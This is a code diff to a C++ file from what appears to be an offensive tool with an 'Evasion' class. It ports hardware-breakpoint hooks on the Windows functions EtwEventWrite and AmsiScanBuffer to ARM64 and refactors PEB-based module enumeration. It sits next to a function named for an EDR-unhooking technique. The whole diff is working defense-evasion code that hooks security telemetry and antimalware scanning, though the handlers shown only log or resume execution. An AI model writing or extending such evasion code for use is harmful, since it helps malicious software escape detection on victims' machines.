@@ -11,6 +11,7 @@
 #ifdef _WIN32
 #include <windows.h>
 #include <tlhelp32.h>
+#include "hwbp.hpp"
 #include "structs.hpp"
 #endif
 
@@ -499,81 +500,174 @@ int Evasion::unhookPerunsFart(std::string& result)
 }
 
 
-int SetHWBP(HANDLE thrd, DWORD64 addr, BOOL setBP) 
+int SetHWBP(HANDLE thrd, DWORD64 addr, BOOL setBP)
 {
-    CONTEXT ctx = { 0 };
-    ctx.ContextFlags = CONTEXT_ALL;
+    CONTEXT ctx;
+    ZeroMemory(&ctx, sizeof(ctx));
 
-    GetThreadContext(thrd, &ctx);
-    
-    if (setBP == TRUE) {
+#if defined(_M_X64) || defined(_M_IX86)
+
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+
+    if (!GetThreadContext(thrd, &ctx))
+        return -1;
+
+    if (setBP)
+    {
         ctx.Dr0 = addr;
-        ctx.Dr7 |= (1 << 0);          // Local DR0 breakpoint
-        ctx.Dr7 &= ~(1 << 16);        // break on execution
-        ctx.Dr7 &= ~(1 << 17);
-
+        ctx.Dr7 |= (1ULL << 0);   // enable local DR0
+        ctx.Dr7 &= ~(3ULL << 16); // execution breakpoint
     }
-    else if (setBP == FALSE) {
-        ctx.Dr0 = NULL;
-        ctx.Dr7 &= ~(1 << 0);
+    else
+    {
+        ctx.Dr0 = 0;
+        ctx.Dr7 &= ~(1ULL << 0);
     }
 
-    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;    
-    SetThreadContext(thrd, &ctx);
+    if (!SetThreadContext(thrd, &ctx))
+        return -1;
+
+#elif defined(_M_ARM64)
+
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+
+    if (!GetThreadContext(thrd, &ctx))
+        return -1;
+
+    if (setBP)
+    {
+        /*
+            ARM64 hardware breakpoint 0:
+            Bvr[0] = breakpoint address
+            Bcr[0] = breakpoint control
+
+            DBGBCR bits:
+            bit 0     = enable
+            bits 2:1  = privilege mode control
+            bits 8:5  = BAS, byte address select
+
+            For A64 instruction address match, BAS should be 0b1111.
+        */
+
+        ctx.Bvr[0] = addr;
+        ctx.Bcr[0] =
+            (1u << 0) |      // E: enable
+            (2u << 1) |      // PMC: EL0/user-mode
+            (0xFu << 5);     // BAS: A64 instruction match
+    }
+    else
+    {
+        ctx.Bvr[0] = 0;
+        ctx.Bcr[0] = 0;
+    }
+
+    if (!SetThreadContext(thrd, &ctx))
+        return -1;
+
+#else
+    #error Unsupported architecture
+#endif
 
     return 0;
 }
 
 
-LONG WINAPI handlerETW(EXCEPTION_POINTERS * ExceptionInfo) 
+LONG WINAPI handlerETW(EXCEPTION_POINTERS* ExceptionInfo)
 {
-    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) 
+    if (EXCEPTION_CODE(ExceptionInfo) != HWBP_EXCEPTION_CODE)
+        return EXCEPTION_CONTINUE_SEARCH;
+
+    BYTE* baseAddress = (BYTE*)GetProcAddress(
+        GetModuleHandleA("ntdll.dll"),
+        "EtwEventWrite"
+    );
+
+    if (!baseAddress)
+        return EXCEPTION_CONTINUE_SEARCH;
+
+#if defined(_M_X64)
+
+    if (EXCEPTION_HIT_ADDRESS(ExceptionInfo, baseAddress))
     {
-        BYTE* baseAddress = (BYTE*)GetProcAddress(GetModuleHandle("ntdll.dll"), "EtwEventWrite");
-#ifdef _WIN64
-        if (ExceptionInfo->ContextRecord->Rip == (DWORD64) baseAddress) 
-        {
-            printf("[!] Exception (%#llx)! Params:\n", ExceptionInfo->ExceptionRecord->ExceptionAddress);
-            printf("(1): %#d | ", ExceptionInfo->ContextRecord->Rcx);
-            printf("(2): %#llx | ", ExceptionInfo->ContextRecord->Rdx);
-            printf("(3): %#llx | ", ExceptionInfo->ContextRecord->R8);
-            printf("(4): %#llx | ", ExceptionInfo->ContextRecord->R9);
-            printf("RSP = %#llx\n", ExceptionInfo->ContextRecord->Rsp);
-            
-            printf("EtwEventWrite called!\n");
-            
-            // continue the execution
-            ExceptionInfo->ContextRecord->EFlags |= (1 << 16);            // set RF (Resume Flag) to continue execution
-            //ExceptionInfo->ContextRecord->Rip++;                        // or skip the breakpoint via instruction pointer
-        }      
-#else   // ===================== X86 =======================   
-        if (ExceptionInfo->ContextRecord->Eip == (DWORD)baseAddress)
-        {
-            printf("[!] Exception (%#lx)! Params:\n",
-                   (unsigned long)ExceptionInfo->ExceptionRecord->ExceptionAddress);
+        printf("[!] Exception (%p)! Params:\n",
+            ExceptionInfo->ExceptionRecord->ExceptionAddress);
 
-            DWORD esp = ExceptionInfo->ContextRecord->Esp;
+        printf("(1): %#llx | ", ExceptionInfo->ContextRecord->Rcx);
+        printf("(2): %#llx | ", ExceptionInfo->ContextRecord->Rdx);
+        printf("(3): %#llx | ", ExceptionInfo->ContextRecord->R8);
+        printf("(4): %#llx | ", ExceptionInfo->ContextRecord->R9);
+        printf("RSP = %#llx\n", ExceptionInfo->ContextRecord->Rsp);
 
-            // 32-bit stdcall: args are on the stack
-            DWORD param1 = *(DWORD*)(esp + 4);
-            DWORD param2 = *(DWORD*)(esp + 8);
-            DWORD param3 = *(DWORD*)(esp + 12);
-            DWORD param4 = *(DWORD*)(esp + 16);
+        printf("EtwEventWrite called!\n");
 
-            printf("(1): %#lx | ", param1);
-            printf("(2): %#lx | ", param2);
-            printf("(3): %#lx | ", param3);
-            printf("(4): %#lx | ", param4);
-            printf("ESP = %#lx\n", (unsigned long)esp);
+        ExceptionInfo->ContextRecord->EFlags |= (1 << 16); // RF
 
-            printf("EtwEventWrite called!\n");
-
-            // Continue execution
-            ExceptionInfo->ContextRecord->EFlags |= (1 << 16);
-        }  
-#endif
         return EXCEPTION_CONTINUE_EXECUTION;
     }
+
+#elif defined(_M_IX86)
+
+    if (EXCEPTION_HIT_ADDRESS(ExceptionInfo, baseAddress))
+    {
+        printf("[!] Exception (%p)! Params:\n",
+            ExceptionInfo->ExceptionRecord->ExceptionAddress);
+
+        DWORD esp = ExceptionInfo->ContextRecord->Esp;
+
+        DWORD param1 = *(DWORD*)(esp + 4);
+        DWORD param2 = *(DWORD*)(esp + 8);
+        DWORD param3 = *(DWORD*)(esp + 12);
+        DWORD param4 = *(DWORD*)(esp + 16);
+
+        printf("(1): %#lx | ", (unsigned long)param1);
+        printf("(2): %#lx | ", (unsigned long)param2);
+        printf("(3): %#lx | ", (unsigned long)param3);
+        printf("(4): %#lx | ", (unsigned long)param4);
+        printf("ESP = %#lx\n", (unsigned long)esp);
+
+        printf("EtwEventWrite called!\n");
+
+        ExceptionInfo->ContextRecord->EFlags |= (1 << 16); // RF
+
+        return EXCEPTION_CONTINUE_EXECUTION;
+    }
+
+#elif defined(_M_ARM64)
+
+    if (EXCEPTION_HIT_ADDRESS(ExceptionInfo, baseAddress))
+    {
+        printf("[!] Exception (%p)! Params:\n",
+            ExceptionInfo->ExceptionRecord->ExceptionAddress);
+
+        /*
+            Windows ARM64 calling convention:
+            first 8 integer/pointer args are in x0-x7.
+            In CONTEXT, they are exposed as X0, X1, X2...
+        */
+
+        printf("(1): %#llx | ", ExceptionInfo->ContextRecord->X0);
+        printf("(2): %#llx | ", ExceptionInfo->ContextRecord->X1);
+        printf("(3): %#llx | ", ExceptionInfo->ContextRecord->X2);
+        printf("(4): %#llx | ", ExceptionInfo->ContextRecord->X3);
+        printf("SP = %#llx\n", ExceptionInfo->ContextRecord->Sp);
+
+        printf("EtwEventWrite called!\n");
+
+        /*
+            ARM64 has no EFlags/RF equivalent.
+            For single-step traps, continuation depends on how you enabled
+            the trap. There is no:
+                ContextRecord->EFlags |= (1 << 16)
+            on ARM64.
+        */
+
+        return EXCEPTION_CONTINUE_EXECUTION;
+    }
+
+#else
+    #error Unsupported architecture
+#endif
+
     return EXCEPTION_CONTINUE_SEARCH;
 }
 
@@ -768,34 +862,42 @@ void* findStringInMemory(const char* target, void* startAddress, int lenght)
 
 LONG WINAPI handlerAmsi(EXCEPTION_POINTERS * ExceptionInfo) 
 {
-    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) 
+    if (EXCEPTION_CODE(ExceptionInfo) == HWBP_EXCEPTION_CODE) 
     {
         BYTE* baseAddress = (BYTE*)GetProcAddress(GetModuleHandle("amsi.dll"), "AmsiScanBuffer");
 
-#ifdef _WIN64
-        if (ExceptionInfo->ContextRecord->Rip == (DWORD64) baseAddress) 
+#if defined(_M_X64)
+        if (EXCEPTION_HIT_ADDRESS(ExceptionInfo, baseAddress)) 
         {
-            // printf("[!] Exception (%#llx)! Params:\n", ExceptionInfo->ExceptionRecord->ExceptionAddress);
-            // printf("(1): %#d | ", ExceptionInfo->ContextRecord->Rcx);
-            // printf("(2): %#llx | ", ExceptionInfo->ContextRecord->Rdx);
-            // printf("(3): %#llx | ", ExceptionInfo->ContextRecord->R8);
-            // printf("(4): %#llx | ", ExceptionInfo->ContextRecord->R9);
-            // printf("RSP = %#llx\n", ExceptionInfo->ContextRecord->Rsp);
-            
-            // printf("AmsiScanBuffer called!\n");
             
             // continue the execution
             ExceptionInfo->ContextRecord->EFlags |= (1 << 16);            // set RF (Resume Flag) to continue execution
             //ExceptionInfo->ContextRecord->Rip++;                        // or skip the breakpoint via instruction pointer
+            return EXCEPTION_CONTINUE_EXECUTION;
         }  
-#else // =========================== X86 ============================ 
-if (ExceptionInfo->ContextRecord->Eip == (DWORD64) baseAddress) 
+#elif defined(_M_IX86)
+        if (EXCEPTION_HIT_ADDRESS(ExceptionInfo, baseAddress)) 
         {            
             // continue the execution
             ExceptionInfo->ContextRecord->EFlags |= (1 << 16);            // set RF (Resume Flag) to continue execution
+            return EXCEPTION_CONTINUE_EXECUTION;
         } 
+#elif defined(_M_ARM64)
+        if (EXCEPTION_HIT_ADDRESS(ExceptionInfo, baseAddress))
+        {
+            /*
+            ARM64 has no EFlags/RF equivalent.
+            For single-step traps, continuation depends on how you enabled
+            the trap. There is no:
+                ContextRecord->EFlags |= (1 << 16)
+            on ARM64.
+            */
+            return EXCEPTION_CONTINUE_EXECUTION;
+        }
+#else
+    #error Unsupported architecture
 #endif
-        return EXCEPTION_CONTINUE_EXECUTION;
+
     }
     return EXCEPTION_CONTINUE_SEARCH;
 }
@@ -864,14 +966,34 @@ std::string wstringToString(const std::wstring& wstr)
 }
 
 
+#if defined(_M_ARM64)
+    #define PEB_OFFSET 0x60
+    #define READ_TEB() ((void*)__getReg(18))
+
+#elif defined(_M_X64)
+    #define PEB_OFFSET 0x60
+    #define READ_TEB() ((void*)__readgsqword(0x30))
+
+#elif defined(_M_IX86)
+    #define PEB_OFFSET 0x30
+    #define READ_TEB() ((void*)__readfsdword(0x18))
+
+#else
+    #error Unsupported architecture
+#endif
+
+
+static void* GetPeb(void)
+{
+    unsigned char* teb = (unsigned char*)READ_TEB();
+    return *(void**)(teb + PEB_OFFSET);
+}
+
+
 std::string EnumerateLoadedModules() 
 {
     // Get the PEB address
-#ifdef _WIN64
-    PPEB pPEB = (PPEB)__readgsqword(0x60);
-#else
-    PPEB pPEB = (PPEB)__readfsdword(0x30);
-#endif
+    PPEB pPEB = (PPEB)GetPeb();
 
     // Get the PEB_LDR_DATA structure
     PPEB_LDR_DATA pLdr = pPEB->LoaderData;
